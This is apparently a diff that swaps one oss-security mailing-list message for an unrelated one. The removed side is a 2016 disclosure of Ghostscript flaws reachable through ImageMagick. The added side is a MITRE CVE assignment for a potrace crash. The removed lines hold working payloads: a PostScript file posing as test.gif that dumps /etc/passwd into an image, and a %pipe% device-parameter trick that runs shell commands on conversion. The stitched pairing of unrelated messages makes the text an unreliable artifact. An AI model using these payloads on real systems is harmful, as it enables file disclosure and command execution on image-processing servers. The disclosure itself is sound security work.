@@ -1,60 +1,44 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/30/8
-Message-ID: <CAJ_zFkJxK8re4yc1xVN79Y9k7tDoO-fFO-xJNzgvVG9ZgPQtzw@mail.gmail.com>
-Date: Fri, 30 Sep 2016 13:05:16 -0700
-From: Tavis Ormandy <taviso@...gle.com>
-To: oss-security@...ts.openwall.com
-Cc: Florian Weimer <fw@...eb.enyo.de>
-Subject: Re: ImageMagick identify "d:" hangs
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/16/9
+Message-Id: <20161016025654.A45A96C0D67@smtpvmsrv1.mitre.org>
+Date: Sat, 15 Oct 2016 22:56:54 -0400 (EDT)
+From: cve-assign@...re.org
+To: ago@...too.org
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: potrace: invalid memory access in findnext (decompose.c)
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Sep 29, 2016 at 2:28 PM, Tavis Ormandy <taviso@...gle.com> wrote:
->
-> Just for future reference, here is an example of dumping a file to an
-> image processed with ImageMagick that works with gs 9.20:
->
-> $ cat test.gif
-> %!PS
-> /Size 20 def                             % font/line size
-> /Line 0 def                              % current line
-> /Buf 1024 string def                     % line buffer
-> /Path 0 newpath def
->
-> /Courier-Bold findfont Size scalefont setfont
-> 1 1 1 setrgbcolor clippath fill          % draw white background
-> 0 0 0 setrgbcolor                        % set black foreground
->
-> (/etc/passwd) .libfile {
->     {
->         dup Buf readline
->         {
->             Path Line moveto show
->         }{
->             showpage
->             quit
->         } ifelse
->         % next line
->         /Line Line Size add def
->     } loop
-> } if
-> $ convert test.gif png:test.png
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-The more I look, the worse it gets. This also works in 9.18 and
-higher, arbitrary shell command execution:
+> https://blogs.gentoo.org/ago/2016/08/29/potrace-invalid-memory-access-in-findnext-decompose-c/
 
-$ cat test.gif
-currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty)
-.putdeviceparams
-quit
-$ convert test.gif png:test.png
+> SEGV on unknown address
 
-(Note: I don't know why it doesn't work on earlier versions, maybe
-it's possible to make it work, or some other param will work)
+> 0x7fd7ec5bcbf3 in findnext ... potrace-1.13/src/decompose.c:436:11
+> 0x7fd7ec5bcbf3 in getenv ... potrace-1.13/src/decompose.c:478
 
-I think -dSAFER is too dangerous to use without sandboxing right now,
-things like evince and imagemagick that use it as a backend should
-disable by default.
+Use CVE-2016-8685.
 
-I'm not planning to look any more at this.
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-Tavis.
+iQIcBAEBCAAGBQJYAud1AAoJEHb/MwWLVhi2ScEP/3lo1mPD67U4CEoptEWB4GRo
+yalqHOyd5Gs5X+D/lV2upZded+s3W2mRZ8ubu0S8bQdhkSbEHH4tX+ovPzV6LaAb
+GNwYTSr1uCOGZCKRlN1HdU7NzQvjeAUi4w2JJBpV+XpTe21cEAopLH4w41Xwue4X
+Wl3U5rF9dRVaqRng1LX56nC9bvHiVGe+DcbmpY46AosSIdTrXiBMi5KtHLgKTE6S
+iYu5nTeIpK8DNsgDSPa9tqdsqxvihrF+xey5rPn02dHFumKJQOCis04VwOxgFtQG
+8WGYob2bhXlxC1+AZcSox5BgIE5hS3MttouVmeqSviSSq1SO/QRF+Qu34iZZcCuI
+573spEard0RIkqcY+RvVij8W2H6507P1fBZKLMjFxhDz4pR5hj6kjArRRL7X0LA8
+WiS4wGK6l33mmUCwAzTfJTrmWlRO5qbJwaM7pGCo3d4BRwdmmq/sTv4Sov2txMxw
+PFtj0FL44QAkuKEjcNp4lbLCF6XE3MB6cfeTnfjyya1evuSP5URD8SUHRB42Kjb5
+FrCUOs2wYKVBOjtUabLKt9mrciBLqarEzXbbY1BWAqmOh8vBDyHGXLQL9oS4GT9E
+BRhuq6CtPdH9+u5UKKSe3/TCQUcvmWNDowQcEqnnIgT7hxm+HGo/iz+9uIFj9ZgQ
+kWGGXBvz+mQSlqdBJEW8
+=odv0
+-----END PGP SIGNATURE-----
